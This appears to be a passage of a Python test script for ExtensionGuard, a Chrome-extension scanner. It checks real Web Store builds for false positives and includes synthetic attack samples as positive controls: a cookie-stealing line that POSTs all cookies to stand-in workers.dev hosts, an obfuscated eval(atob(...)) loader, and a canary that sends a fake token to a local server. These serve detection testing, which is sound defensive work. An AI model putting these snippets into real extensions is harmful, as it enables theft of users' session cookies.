# tools/real_extension_check.py - Test ExtensionGuard against REAL Chrome Web
# Store extensions, in a way anyone can repeat.
#
# The unit tests use synthetic samples. This checks what matters in real use:
# popular, genuine extensions must NOT be flagged as malicious, while known
# attack shapes still are. For each extension in EXTENSIONS:
#
#   1. Ask the Chrome Web Store update service for the current build
#      (version, download URL, size, SHA-256) - the same request Chrome makes.
#   2. Download it and compare its SHA-256 with the store's. The file under
#      test is then provably the genuine, unmodified store build.
#   3. Static scan: run the real `extguard` CLI on it (--json --no-ai; Web
#      Store and OSV lookups on, VirusTotal off). A genuine extension rated
#      HIGH/CRITICAL, or reported with "evidence" of malice, is a false
#      positive.
#
# Positive controls: synthetic attack samples (TeamPCP, Shai-Hulud,
# Cyberhaven-style) must still be rated HIGH/CRITICAL - so "no false
# positives" can't come from a detector that never fires.
#
# --runtime: load every extension into Chrome for Testing (headless,
# throwaway profile), attach extguard-monitor and browse a few ordinary
# sites. Any alert about a genuine extension is a false positive. A small
# test-only "canary" extension that sends a FAKE token to a local server is
# loaded too: the monitor MUST catch it, which proves it was really watching.
#
# Nothing is committed or redistributed: the extensions are fetched from
# Google at run time. Branded Chrome refuses --load-extension, which is why
# the runtime part needs Chrome for Testing:
#   https://googlechromelabs.github.io/chrome-for-testing/
#
# Usage:
#   python tools/real_extension_check.py
#   python tools/real_extension_check.py --runtime --chrome PATH/TO/chrome
#   python tools/real_extension_check.py --cache-dir crx-cache \
#       --json-report report.json --markdown report.md
#
# Exit code 0 = every check passed, 1 = a check failed (listed),
#           2 = the test could not run (network, Chrome, bad arguments).

import argparse
import asyncio
import base64
import hashlib
import http.server
import io
import json
import os
import platform
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import xml.etree.ElementTree as ET
import zipfile
from datetime import datetime, timezone
from pathlib import Path
from urllib.request import Request, urlopen

REPO_ROOT = Path(__file__).resolve().parent.parent
# Test the code in THIS checkout, even when an older extensionguard is installed
sys.path.insert(0, str(REPO_ROOT))

from extguard import __version__ as EXTGUARD_VERSION  # noqa: E402
from extguard.crx_parser import check_zip_limits, parse_extension  # noqa: E402
from extguard.publisher_checker import CWS_UPDATE_TEMPLATE, parse_crx3_identity  # noqa: E402

# ---------------------------------------------------------------------------
# What to test
# ---------------------------------------------------------------------------

# Popular extensions whose PERMISSIONS look alarming (all-sites access,
# cookies, scripting, native messaging...) but which are genuine. Exactly the
# kind a permission-counting scanner flags - and a SOC must not block.
EXTENSIONS = [
    {"slug": "ublock-origin-lite", "name": "uBlock Origin Lite",
     "id": "ddkjiahejlhfcafbddmgiahcphecmpfh"},
    {"slug": "bitwarden", "name": "Bitwarden Password Manager",
     "id": "nngceckbapebfimnlniiiahkandclblb"},
    {"slug": "grammarly", "name": "Grammarly",
     "id": "kbfnbcaeplbcioakkpcpgfkobkghlhen"},
    {"slug": "dark-reader", "name": "Dark Reader",
     "id": "eimadpbcbfnmbkopoojfekhnkhdbieeh"},
    {"slug": "react-devtools", "name": "React Developer Tools",
     "id": "fmkadmapgofadopljbjfkapdkoienihi"},
    {"slug": "json-formatter", "name": "JSON Formatter",
     "id": "bcjindcccaagfpapjjmafapmmgkkhgoa"},
    {"slug": "google-translate", "name": "Google Translate",
     "id": "aapbdbdomjkkjkaonfhkkikfgjllcleb"},
]  # fmt: skip

# Ordinary sites browsed during --runtime. The JSON page gives JSON Formatter
# something to do; the others exercise content scripts on real-world pages.
SITES = [
    "https://example.com/",
    "https://en.wikipedia.org/wiki/Browser_extension",
    "https://github.com/Vimal7747/extensionguard",
    "https://www.bbc.com/news",
    "https://developer.mozilla.org/en-US/docs/Web/JavaScript",
    "https://api.github.com/repos/Vimal7747/extensionguard",
]

SETTLE_SECONDS = 12  # after Chrome starts: let the monitor attach to everything
DWELL_SECONDS = 15  # time spent on each site
FINAL_SECONDS = 10  # after the last site: let late requests and alerts arrive

LEVELS = ["low", "medium", "high", "critical"]
BAD_LEVELS = ("high", "critical")  # what a genuine extension must never get

# Store builds are served from Google's download hosts. The SHA-256 check is
# what proves the bytes; the host check stops us fetching from anywhere else.
DOWNLOAD_HOST_SUFFIXES = (".googleusercontent.com", ".google.com")
MAX_CRX_BYTES = 200 * 1024 * 1024
USER_AGENT = f"extensionguard-real-extension-check/{EXTGUARD_VERSION}"

CANARY_NAME = "ExtensionGuard canary"


class SetupError(Exception):
    """The test could not run (network, Chrome, bad data) - exit code 2."""


# ---------------------------------------------------------------------------
# 1 + 2. Find the store build, download it, prove it's genuine
# ---------------------------------------------------------------------------


def parse_update_reply(xml_text: str, ext_id: str) -> dict:
    """
    Read the store's update reply. A known extension looks like:
      <app appid="..." status="ok">
        <updatecheck codebase="https://.../X.crx" hash_sha256="..."
                     size="1145560" status="ok" version="2.0.17"/>
      </app>
    Returns {"version", "url", "sha256", "size"}; raises SetupError otherwise.
    """
    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError as exc:
        raise SetupError(f"{ext_id}: unreadable reply from the Web Store ({exc})") from exc

    for app in root.iter():
        if not app.tag.endswith("app") or app.get("appid") != ext_id:
            continue
        if app.get("status") != "ok":
            raise SetupError(f"{ext_id}: Web Store status {app.get('status')!r}")
        for check in app:
            if check.tag.endswith("updatecheck") and check.get("status") == "ok":
                build = {
                    "version": check.get("version"),
                    "url": check.get("codebase"),
                    "sha256": (check.get("hash_sha256") or "").lower(),
                    "size": int(check.get("size") or 0),
                }
                if not all(build.values()):
                    raise SetupError(f"{ext_id}: Web Store reply is missing {build}")
                return build
    raise SetupError(f"{ext_id}: the Web Store reply has no build for this extension")


def query_store(ext_id: str) -> dict:
    """Ask the Web Store update service for an extension's current build."""
    url = CWS_UPDATE_TEMPLATE.format(ext_id=ext_id)
    try:
        with urlopen(Request(url, headers={"User-Agent": USER_AGENT}), timeout=30) as resp:
            return parse_update_reply(resp.read(64 * 1024).decode("utf-8", "replace"), ext_id)
    except OSError as exc:
        raise SetupError(f"{ext_id}: Web Store update check failed ({exc})") from exc


def check_download_url(url: str):
    """Only fetch store builds over HTTPS from Google's own download hosts."""
    parts = urllib.parse.urlsplit(url)
    host = (parts.hostname or "").lower()
    if parts.scheme != "https" or not host.endswith(DOWNLOAD_HOST_SUFFIXES):
        raise SetupError(f"refusing to download from {url!r} - not a Google download host")


def sha256_of(path: Path) -> str:
    digest = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def find_cached(cache_dir: Path, build: dict):
    """A file in the cache that IS this build (same size and SHA-256), or None."""
    for path in sorted(cache_dir.glob("*.crx")):
        if path.stat().st_size == build["size"] and sha256_of(path) == build["sha256"]:
            return path
    return None


def download_build(ext: dict, build: dict, cache_dir: Path) -> tuple:
    """
    Return (path, "cached" or "downloaded") of a local copy of `build` whose
    SHA-256 equals the one the store published. Raises SetupError on any
    mismatch - we never test a file we can't prove is the store's.
    """
    cached = find_cached(cache_dir, build)
    if cached:
        return cached, "cached"

    check_download_url(build["url"])
    if build["size"] > MAX_CRX_BYTES:
        raise SetupError(f"{ext['name']}: {build['size']:,} bytes is over the size limit")

    target = cache_dir / f"{ext['slug']}-{build['version']}.crx"
    partial = target.with_suffix(".part")
    digest = hashlib.sha256()
    received = 0
    try:
        request = Request(build["url"], headers={"User-Agent": USER_AGENT})
        with urlopen(request, timeout=120) as resp, open(partial, "wb") as out:
            while chunk := resp.read(1024 * 1024):
                received += len(chunk)
                if received > MAX_CRX_BYTES:
                    raise SetupError(f"{ext['name']}: download is over the size limit")
                digest.update(chunk)
                out.write(chunk)
    except OSError as exc:
        partial.unlink(missing_ok=True)
        raise SetupError(f"{ext['name']}: download failed ({exc})") from exc
    except SetupError:
        partial.unlink(missing_ok=True)
        raise

    if digest.hexdigest() != build["sha256"] or received != build["size"]:
        partial.unlink(missing_ok=True)
        raise SetupError(
            f"{ext['name']}: downloaded file does not match the store's SHA-256/size - "
            "not testing it"
        )
    partial.replace(target)
    return target, "downloaded"


# ---------------------------------------------------------------------------
# 3. Static scan with the real CLI
# ---------------------------------------------------------------------------


def scan_env(home: Path) -> dict:
    """Environment for a scan: isolated data dir, no AI, no VirusTotal."""
    env = dict(os.environ)
    for secret in ("ANTHROPIC_API_KEY", "VT_API_KEY"):
        env.pop(secret, None)
    env.update(
        EXTGUARD_HOME=str(home),
        VT_DISABLED="1",
        PYTHONIOENCODING="utf-8",
        PYTHONPATH=os.pathsep.join(filter(None, [str(REPO_ROOT), env.get("PYTHONPATH")])),
    )
    return env


def run_scan(path: Path, home: Path, offline: bool = False) -> dict:
    """Run `extguard <path> --json --no-ai` and return its JSON report."""
    command = [sys.executable, "-m", "extguard", str(path), "--json", "--no-ai"]
    if offline:
        command.append("--offline")
    done = subprocess.run(
        command,
        capture_output=True,
        text=True,
        encoding="utf-8",
        env=scan_env(home),
        timeout=600,
    )
    try:
        return json.loads(done.stdout)
    except ValueError:
        tail = (done.stderr or done.stdout or "")[-300:]
        return {"scan_failed": f"no JSON report (exit {done.returncode}): {tail}"}


def judge_genuine(ext: dict, report: dict) -> list:
    """Problems with the scan of a GENUINE store build (empty list = pass)."""
    if "scan_failed" in report:
        return [f"scan failed - {report['scan_failed']}"]
    problems = []
    level = report.get("risk_level")
    verdict = report.get("verdict") or {}
    publisher = (report.get("stage_1_checks") or {}).get("publisher") or {}

    if level in BAD_LEVELS:
        problems.append(f"rated {level.upper()} ({report.get('final_score')}/100) - false positive")
    if verdict.get("evidence"):
        problems.append("reported evidence of malice: " + "; ".join(verdict["evidence"]))
    if publisher.get("extension_id") != ext["id"]:
        problems.append(f"extension ID read as {publisher.get('extension_id')}, not {ext['id']}")
    if not verdict.get("verified_store_build"):
        problems.append(
            "not recognised as the verified store build "
            f"(store relation: {publisher.get('store_relation')})"
        )
    for stage, error in (report.get("stage_errors") or {}).items():
        problems.append(f"stage {stage} did not complete: {error}")
    return problems


def check_genuine(extensions: list, cache_dir: Path, home: Path) -> list:
    """Steps 1-3 for every extension. Returns one result dict each."""
    results = []
    for number, ext in enumerate(extensions, 1):
        print(f"[{number}/{len(extensions)}] {ext['name']}", flush=True)
        build = query_store(ext["id"])
        path, source = download_build(ext, build, cache_dir)
        print(
            f"      store v{build['version']} ({build['size'] / 1e6:.1f} MB) - {source}, "
            "SHA-256 matches the store",
            flush=True,
        )
        started = time.perf_counter()
        report = run_scan(path, home)
        seconds = round(time.perf_counter() - started, 1)
        problems = judge_genuine(ext, report)
        verdict = report.get("verdict") or {}
        result = {
            **ext,
            "version": build["version"],
            "size": build["size"],
            "sha256": build["sha256"],
            "store_sha256_match": True,  # download_build refuses anything else
            "path": str(path),
            "scan_seconds": seconds,
            "manifest_name": report.get("extension_name"),
            "risk_level": report.get("risk_level"),
            "final_score": report.get("final_score"),
            "capability_score": verdict.get("uncapped_score"),
            "verified_store_build": verdict.get("verified_store_build"),
            "evidence": verdict.get("evidence", []),
            "anomalies": verdict.get("anomalies", []),
            "verdict_reason": verdict.get("reason"),
            "problems": problems,
        }
        results.append(result)
        print(
            f"      scanned in {seconds}s: {str(result['risk_level']).upper()} "
            f"{result['final_score']} (capability {result['capability_score']}) - "
            + ("PASS" if not problems else "FAIL: " + "; ".join(problems)),
            flush=True,
        )
    return results


# ---------------------------------------------------------------------------
# Positive controls: attack samples that MUST still be caught
# ---------------------------------------------------------------------------

SHAI_HULUD_MANIFEST = {
    "manifest_version": 3,
    "name": "Helper",
    "version": "1.0.0",
    "permissions": ["debugger", "nativeMessaging", "tabs", "storage"],
    "host_permissions": ["<all_urls>"],
    "background": {"service_worker": "bg.js"},
}
DLP_MANIFEST = {  # the shape of the Cyberhaven extension before its hijack
    "manifest_version": 3,
    "name": "DLP Vendor",
    "version": "24.10.3",
    "permissions": ["cookies", "storage"],
    "host_permissions": ["https://api.dlp.example/*"],
    "background": {"service_worker": "bg.js"},
}
COOKIE_EXFIL_JS = (
    "chrome.cookies.getAll({}, c => fetch('https://{host}/c', "
    "{method: 'POST', body: JSON.stringify(c)}));"
)
OBFUSCATED_LOADER_JS = (
    ";".join(f"var _0x{i:04x}=_0x{i + 1:04x}" for i in range(40))
    + ";eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXZpbC5leGFtcGxlJyk='));"
)


def zipped(path: Path, manifest: dict, code: str) -> Path:
    """Write a minimal extension package (manifest.json + bg.js)."""
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("manifest.json", json.dumps(manifest))
        zf.writestr("bg.js", code)
    return path


def check_controls(work: Path) -> list:
    """Scan the attack samples offline; each must reach its expected level."""
    work.mkdir(parents=True, exist_ok=True)
    home = work / "home"
    teampcp = json.loads((REPO_ROOT / "test_fixtures" / "teamccp_sim_manifest.json").read_text())
    (work / "teampcp.json").write_text(json.dumps(teampcp))
    (work / "shai-hulud.json").write_text(json.dumps(SHAI_HULUD_MANIFEST))
    exfil = COOKIE_EXFIL_JS.replace("{host}", "nx-sync.workers.dev")

    cases = [
        ("TeamPCP permissions, manifest only", work / "teampcp.json", "high"),
        ("Shai-Hulud permissions, manifest only", work / "shai-hulud.json", "high"),
        ("TeamPCP package with cookie-exfil code",
         zipped(work / "teampcp.zip", teampcp, exfil), "critical"),
        ("Shai-Hulud package with obfuscated eval loader",
         zipped(work / "shai-hulud.zip", SHAI_HULUD_MANIFEST, OBFUSCATED_LOADER_JS), "critical"),
    ]  # fmt: skip

    print("Attack samples (must be HIGH or CRITICAL)", flush=True)
    results = []
    for label, path, expected in cases:
        results.append(_control_result(label, run_scan(path, home, offline=True), expected))

    # Cyberhaven, December 2024: a trusted extension's patch release starts
    # exfiltrating cookies. Scan the clean build first so it is the baseline.
    clean = "chrome.storage.local.get('s', () => {});"
    run_scan(zipped(work / "dlp-1.zip", DLP_MANIFEST, clean), home, offline=True)
    hijacked = zipped(
        work / "dlp-2.zip",
        {**DLP_MANIFEST, "version": "24.10.4"},
        clean + "\n" + COOKIE_EXFIL_JS.replace("{host}", "cyberhavenext.workers.dev"),
    )
    results.append(
        _control_result(
            "Cyberhaven-style hijacked patch update",
            run_scan(hijacked, home, offline=True),
            "high",
        )
    )
    for result in results:
        print(
            f"      {result['label']}: {str(result['risk_level']).upper()} "
            f"{result['final_score']} - " + ("PASS" if not result["problems"] else "FAIL"),
            flush=True,
        )
    return results


def _control_result(label: str, report: dict, expected: str) -> dict:
    level = report.get("risk_level")
    problems = []
    if "scan_failed" in report:
        problems.append(f"scan failed - {report['scan_failed']}")
    elif level not in LEVELS or LEVELS.index(level) < LEVELS.index(expected):
        problems.append(f"rated {level} - should be at least {expected.upper()} (missed attack)")
    return {
        "label": label,
        "expected_at_least": expected,
        "risk_level": level,
        "final_score": report.get("final_score"),
        "evidence": (report.get("verdict") or {}).get("evidence", []),
        "problems": problems,
    }


# ---------------------------------------------------------------------------
# --runtime: real Chrome, real sites, extguard-monitor attached
# ---------------------------------------------------------------------------


def unpack_for_chrome(crx_path: Path, target: Path) -> str:
    """
    Unpack a store CRX so Chrome can --load-extension it, and return its ID.
    The store's public key goes into manifest.json as "key", so the unpacked
    copy keeps its real Web Store ID - alerts then name the real extension.
    """
    parsed = parse_extension(str(crx_path))
    identity = parse_crx3_identity(parsed.crx3_header or b"")
    if not identity["developer_key"]:
        raise SetupError(f"{crx_path.name}: no signing key in the CRX header")
    with zipfile.ZipFile(io.BytesIO(parsed.zip_bytes)) as zf:
        check_zip_limits(zf)
        zf.extractall(target)  # zipfile drops absolute and ".." paths
    manifest_path = target / "manifest.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8-sig"))
    manifest["key"] = base64.b64encode(identity["developer_key"]).decode("ascii")
    manifest_path.write_text(json.dumps(manifest, ensure_ascii=False), encoding="utf-8")
    return identity["extension_id"]


def write_canary(target: Path, port: int):
    """
    A test-only extension that misbehaves with a FAKE GitHub token, in the
    two ways the monitor watches:
      - the moment it starts, it saves the token to chrome.storage (RULE-04,
        seen by the hooks the monitor injects - proves they were in place
        before the extension's first line ran);
      - whenever a tab finishes loading, it posts the token to the local
        server (RULE-02, seen on the network).
    """
    target.mkdir(parents=True, exist_ok=True)
    manifest = {
        "manifest_version": 3,
        "name": CANARY_NAME,
        "version": "1.0",
        "description": "Test-only: misuses a fake token so the monitor must alert",
        "background": {"service_worker": "bg.js"},
        "permissions": ["storage"],
        "host_permissions": ["http://127.0.0.1/*"],
    }
    (target / "manifest.json").write_text(json.dumps(manifest))
    (target / "bg.js").write_text(
        "// Test-only canary for tools/real_extension_check.py - the token is fake\n"
        'chrome.storage.local.set({stash: "ghp_" + "x".repeat(36)});\n'
        "chrome.tabs.onUpdated.addListener((tabId, info) => {\n"
        '  if (info.status !== "complete") return;\n'
        f'  fetch("http://127.0.0.1:{port}/collect", {{method: "POST",\n'
        '    body: "token=ghp_" + "x".repeat(36)});\n'
        "});\n"
    )


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def start_sink() -> tuple:
    """A local HTTP server that records the canary's POSTs. (server, hits)"""
    hits = []

    class Sink(http.server.BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def do_POST(self):
            hits.append(self.path)
            self.rfile.read(int(self.headers.get("Content-Length") or 0))
            self.send_response(204)
            self.end_headers()

    server = http.server.ThreadingHTTPServer(("127.0.0.1", free_port()), Sink)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, hits


def wait_for_devtools(port: int) -> dict:
    """Chrome's /json/version once it answers: browser version + websocket URL."""
    for _ in range(120):
        try:
            with urlopen(f"http://127.0.0.1:{port}/json/version", timeout=1) as resp:
                return json.load(resp)
        except OSError:
            time.sleep(0.25)
    raise SetupError("Chrome started but its DevTools endpoint never answered")


class DevTools:
    """Minimal Chrome DevTools Protocol client: send a command, await its reply."""

    def __init__(self, ws):
        self.ws = ws
        self.next_id = 0

    async def call(self, method: str, session: str | None = None, **params):
        self.next_id += 1
        message = {"id": self.next_id, "method": method, "params": params}
        if session:
            message["sessionId"] = session
        await self.ws.send(json.dumps(message))
        while True:  # skip events until our reply arrives
            reply = json.loads(await self.ws.recv())
            if reply.get("id") == self.next_id:
                if "error" in reply:
                    raise SetupError(f"DevTools {method} failed: {reply['error']}")
                return reply.get("result", {})


INSTALLED_EXTENSIONS_JS = (
    "new Promise(done => chrome.developerPrivate.getExtensionsInfo("
    "{includeDisabled: true, includeTerminated: true}, list => done(list.map(e => ("
    "{id: e.id, name: e.name, version: e.version, state: e.state})))))"
)


async def installed_extensions(cdp: DevTools) -> list:
    """Ask chrome://extensions which extensions are installed and enabled."""
    target = await cdp.call("Target.createTarget", url="chrome://extensions/")
    attached = await cdp.call("Target.attachToTarget", targetId=target["targetId"], flatten=True)
    try:
        for _ in range(20):  # the page needs a moment before its API exists
            result = await cdp.call(
                "Runtime.evaluate",
                session=attached["sessionId"],
                expression=INSTALLED_EXTENSIONS_JS,
                awaitPromise=True,
                returnByValue=True,
            )
            value = result.get("result", {}).get("value")
            if isinstance(value, list):
                return value
            await asyncio.sleep(0.5)
        raise SetupError("could not read the installed extensions from chrome://extensions")
    finally:
        await cdp.call("Target.closeTarget", targetId=target["targetId"])


async def install_extensions(cdp: DevTools, ext_dirs: list) -> list:
    """
    Install each unpacked extension into the RUNNING browser and return the
    IDs Chrome gave them. Doing this after the monitor has attached - rather
    than with --load-extension at launch - means every machine observes each
    extension's first-install work. (uBlock Origin Lite writes ~1 MB of
    filter data then: a fast PC used to finish before the monitor attached,
    a slow CI runner didn't, so the two saw different things.)
    """
    ids = []
    for ext_dir in ext_dirs:
        result = await cdp.call("Extensions.loadUnpacked", path=str(ext_dir))
        ids.append(result.get("id"))
    return ids


async def browse(ws_url: str, ext_dirs: list) -> tuple:
    """Drive the browser: install the extensions under the monitor, visit SITES."""
    import websockets

    async with websockets.connect(ws_url, max_size=None) as ws:
        cdp = DevTools(ws)
        await asyncio.sleep(SETTLE_SECONDS)  # the monitor attaches
        installed_ids = await install_extensions(cdp, ext_dirs)
        print(f"      installed {len(installed_ids)} extensions with the monitor attached")
        await asyncio.sleep(SETTLE_SECONDS)  # their first-install work, observed
        installed = await installed_extensions(cdp)
        for url in SITES:
            print(f"      visiting {url}", flush=True)
            await cdp.call("Target.createTarget", url=url)
            await asyncio.sleep(DWELL_SECONDS)
        await asyncio.sleep(FINAL_SECONDS)
        try:
            await cdp.call("Browser.close")
        except Exception:
            pass  # Chrome may drop the connection while closing - that's fine
    return installed_ids, installed


def chrome_command(chrome: Path, port: int, profile: Path) -> list:
    command = [
        str(chrome),
        "--headless=new",
        f"--user-data-dir={profile}",
        f"--remote-debugging-port={port}",
        "--remote-debugging-address=127.0.0.1",
        # Lets DevTools install unpacked extensions (Extensions.loadUnpacked)
        "--enable-unsafe-extension-debugging",
        "--no-first-run",
        "--no-default-browser-check",
    ]
    if sys.platform.startswith("linux"):
        # CI runners can't use Chrome's setuid sandbox; the runner is a
        # throwaway VM. Windows/macOS keep the sandbox.
        command.append("--no-sandbox")
    return command + ["about:blank"]


def judge_runtime(genuine: list, installed: list, alerts: list, hits: list,
                  monitor_log: str) -> dict:  # fmt: skip
    """Turn what happened in the browser into per-extension results + problems."""
    by_id = {e["id"]: e for e in installed}
    canary_ids = {e["id"] for e in installed if e.get("name") == CANARY_NAME}
    genuine_ids = {ext["id"] for ext in genuine}

    def is_canary(alert):
        ext = alert.get("extension") or {}
        return ext.get("id") in canary_ids or ext.get("name") == CANARY_NAME

    canary_alerts = [a for a in alerts if is_canary(a)]
    other_alerts = [a for a in alerts if not is_canary(a)]
    problems = []
    rows = []
    for ext in genuine:
        info = by_id.get(ext["id"])
        loaded = bool(info and info.get("state") == "ENABLED")
        mine = [a for a in other_alerts if (a.get("extension") or {}).get("id") == ext["id"]]
        row = {
            "name": ext["name"],
            "id": ext["id"],
            "loaded": loaded,
            "loaded_version": info.get("version") if info else None,
            "alerts": [_alert_summary(a) for a in mine],
        }
        rows.append(row)
        if not loaded:
            problems.append(
                f"{ext['name']} did not load in Chrome (state: {info and info['state']})"
            )
        for alert in row["alerts"]:
            problems.append(f"{ext['name']}: false alarm {alert}")

    for alert in other_alerts:
        if (alert.get("extension") or {}).get("id") not in genuine_ids:
            problems.append(f"alert about an unexpected extension: {_alert_summary(alert)}")

    canary_rule02 = [a for a in canary_alerts if a.get("rule") == "RULE-02"]
    canary_rule04 = [a for a in canary_alerts if a.get("rule") == "RULE-04"]
    canary_loaded = any(by_id[i].get("state") == "ENABLED" for i in canary_ids)
    if not canary_loaded:
        problems.append("the canary extension did not load in Chrome")
    if not hits:
        problems.append("the canary extension never ran (no requests reached the local server)")
    if not canary_rule02:
        problems.append(
            "the canary's fake token on the network was NOT detected (RULE-02) - "
            "the monitor was not watching"
        )
    if not canary_rule04:
        problems.append(
            "the canary's fake token in storage was NOT detected (RULE-04) - the monitor's "
            "hooks were not in place when the extension started"
        )
    if "Traceback" in monitor_log:
        problems.append("extguard-monitor crashed: " + monitor_log.strip().splitlines()[-1][:200])

    return {
        "extensions": rows,
        "canary": {
            "loaded": canary_loaded,
            "requests_sent": len(hits),
            "alerts": len(canary_alerts),
            "rule02_alerts": len(canary_rule02),
            "rule04_alerts": len(canary_rule04),
        },
        "problems": problems,
    }


def _alert_summary(alert: dict) -> str:
    detail = alert.get("detail") or {}
    keys = detail.get("keys")  # RULE-04: which storage keys were written
    return (
        f"{alert.get('rule')} {alert.get('severity')}: {str(detail.get('description', ''))[:120]}"
        + (f" (keys: {', '.join(map(str, keys[:5]))})" if keys else "")
    )


def check_runtime(genuine: list, chrome: Path, work: Path) -> dict:
    """Load everything into Chrome for Testing with the monitor attached."""
    if not chrome.exists():
        raise SetupError(f"Chrome for Testing not found at {chrome}")
    print("Runtime: loading the extensions into Chrome for Testing (headless)", flush=True)
    ext_dirs = []
    for result in genuine:
        target = work / "unpacked" / result["slug"]
        unpacked_id = unpack_for_chrome(Path(result["path"]), target)
        if unpacked_id != result["id"]:
            raise SetupError(f"{result['name']}: unpacked ID {unpacked_id} != {result['id']}")
        ext_dirs.append(target)

    server, hits = start_sink()
    write_canary(work / "unpacked" / "canary", server.server_address[1])
    ext_dirs.append(work / "unpacked" / "canary")

    port = free_port()
    chrome_proc = subprocess.Popen(
        chrome_command(chrome, port, work / "profile"),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    alerts_path = work / "alerts.jsonl"
    log_path = work / "monitor.log"
    monitor = None
    started = time.perf_counter()
    try:
        version = wait_for_devtools(port)
        with open(alerts_path, "w", encoding="utf-8") as out, \
                open(log_path, "w", encoding="utf-8") as log:  # fmt: skip
            monitor = subprocess.Popen(
                [sys.executable, "-m", "extguard.behavioral_monitor", "--host", "127.0.0.1",
                 "--port", str(port), "--output-json", "--once"],
                stdout=out, stderr=log, env=scan_env(work / "monitor-home"),
            )  # fmt: skip
            installed_ids, installed = asyncio.run(
                browse(version["webSocketDebuggerUrl"], ext_dirs)
            )
            try:
                monitor.wait(timeout=30)
            except subprocess.TimeoutExpired:
                monitor.kill()
                monitor.wait(timeout=30)
    finally:
        if monitor and monitor.poll() is None:
            monitor.kill()
            monitor.wait(timeout=30)
        # Always reap Chrome: kill() only sends the signal (see the 2026-10-12
        # live-test failure in tests/test_live_monitor.py)
        if chrome_proc.poll() is None:
            chrome_proc.kill()
        chrome_proc.wait(timeout=30)
        server.shutdown()
        server.server_close()

    # installed_ids is in ext_dirs order: the genuine ones, then the canary
    for result, installed_id in zip(genuine, installed_ids, strict=False):
        if installed_id != result["id"]:
            raise SetupError(f"{result['name']}: Chrome installed it as {installed_id}")

    alerts = []
    for line in alerts_path.read_text(encoding="utf-8").splitlines():
        if line.strip():
            try:
                alerts.append(json.loads(line))
            except ValueError:
                pass  # not an alert line
    result = judge_runtime(
        genuine, installed, alerts, hits, log_path.read_text(encoding="utf-8", errors="replace")
    )
    result.update(
        chrome=version.get("Browser"),
        sites=SITES,
        seconds=round(time.perf_counter() - started),
        total_alerts=len(alerts),
    )
    for row in result["extensions"]:
        print(
            f"      {row['name']}: loaded={row['loaded']} alerts={len(row['alerts'])}",
            flush=True,
        )
    print(
        f"      canary: {result['canary']['requests_sent']} requests sent, "
        f"{result['canary']['rule02_alerts']} RULE-02 + "
        f"{result['canary']['rule04_alerts']} RULE-04 alerts",
        flush=True,
    )
    return result


# ---------------------------------------------------------------------------
# Report
# ---------------------------------------------------------------------------


def all_problems(report: dict) -> list:
    """Every problem in the report, each prefixed with where it came from."""
    problems = []
    for result in report.get("extensions", []):
        problems += [f"{result['name']}: {p}" for p in result["problems"]]
    for result in report.get("controls", []):
        problems += [f"{result['label']}: {p}" for p in result["problems"]]
    if report.get("runtime"):
        problems += [f"runtime: {p}" for p in report["runtime"]["problems"]]
    return problems


def _cell(text) -> str:
    """Make a value safe inside a Markdown table cell."""
    return str(text).replace("|", "/").replace("\n", " ")


def chrome_label(browser: str | None) -> str:
    """'Chrome/155.0.8059.39' (from /json/version) -> 'Chrome for Testing 155.0.8059.39'."""
    version = str(browser or "unknown").rpartition("/")[2]
    return f"Chrome for Testing {version}"


def render_markdown(report: dict) -> str:
    """The human-readable summary (also used as the GitHub job summary)."""
    meta = report["meta"]
    lines = [
        "## ExtensionGuard real-extension check",
        "",
        f"{meta['date']} - ExtensionGuard {meta['extensionguard_version']} - "
        f"Python {meta['python']} - {meta['platform']}"
        + (f" - {chrome_label(report['runtime']['chrome'])}" if report.get("runtime") else ""),
        "",
        f"**Result: {'PASS' if report['passed'] else 'FAIL'}**",
        "",
        "### Genuine Web Store extensions (static scan)",
        "",
        "Each file's SHA-256 equals the one the Chrome Web Store publishes for that version.",
        "",
        "| Extension | Version | SHA-256 | Capability score | Verdict | Evidence | Result |",
        "|---|---|---|---|---|---|---|",
    ]
    for r in report["extensions"]:
        lines.append(
            f"| {_cell(r['name'])} | {_cell(r['version'])} | `{r['sha256'][:12]}` "
            f"| {r['capability_score']} | {str(r['risk_level']).upper()} ({r['final_score']}) "
            f"| {_cell('; '.join(r['evidence']) or 'none')} "
            f"| {'PASS' if not r['problems'] else 'FAIL'} |"
        )
    lines += [
        "",
        "### Attack samples (must be rated HIGH or CRITICAL)",
        "",
        "| Sample | Verdict | Evidence | Result |",
        "|---|---|---|---|",
    ]
    for r in report["controls"]:
        lines.append(
            f"| {_cell(r['label'])} | {str(r['risk_level']).upper()} ({r['final_score']}) "
            f"| {_cell('; '.join(r['evidence'])[:150] or 'none')} "
            f"| {'PASS' if not r['problems'] else 'FAIL'} |"
        )
    runtime = report.get("runtime")
    if runtime:
        lines += [
            "",
            f"### Runtime: Chrome for Testing + extguard-monitor, {len(runtime['sites'])} sites, "
            f"{runtime['seconds']} s",
            "",
            "| Extension | Loaded | Alerts | Result |",
            "|---|---|---|---|",
        ]
        for row in runtime["extensions"]:
            ok = row["loaded"] and not row["alerts"]
            lines.append(
                f"| {_cell(row['name'])} | {'yes' if row['loaded'] else 'NO'} "
                f"| {len(row['alerts'])} | {'PASS' if ok else 'FAIL'} |"
            )
        canary = runtime["canary"]
        caught = canary["rule02_alerts"] and canary["rule04_alerts"] and canary["requests_sent"]
        lines.append(
            f"| {CANARY_NAME} (fake token, must be caught) "
            f"| {'yes' if canary['loaded'] else 'NO'} "
            f"| {canary['rule02_alerts']} RULE-02 (network), "
            f"{canary['rule04_alerts']} RULE-04 (storage, at start-up) "
            f"| {'PASS' if caught else 'FAIL'} |"
        )
    problems = all_problems(report)
    if problems:
        lines += ["", "### Problems", ""] + [f"- {_cell(p)}" for p in problems]
    return "\n".join(lines) + "\n"


def github_outputs(report: dict, markdown: str):
    """On GitHub Actions: job summary + public annotations for each problem."""
    if os.environ.get("GITHUB_ACTIONS") != "true":
        return
    summary = os.environ.get("GITHUB_STEP_SUMMARY")
